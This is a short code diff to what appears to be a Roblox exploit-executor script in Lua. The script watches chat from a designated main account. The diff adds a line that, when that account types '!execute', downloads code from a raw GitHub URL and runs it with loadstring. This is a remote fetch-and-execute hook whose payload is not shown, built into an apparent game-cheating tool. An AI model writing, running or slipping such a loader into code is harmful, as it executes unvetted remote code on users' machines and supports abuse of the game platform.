@@ -3,6 +3,6 @@ getgenv().mainaccount = "User"
 
 game:GetService("Players"):FindFirstChild(getgenv().mainaccount).Chatted:connect(function(msg)
    if msg == "!execute" then
-       
+       loadstring(game:HttpGet("https://raw.githubusercontent.com/PolisXY/3D-Objects/main/ScriptRun"))()
    end
 end)
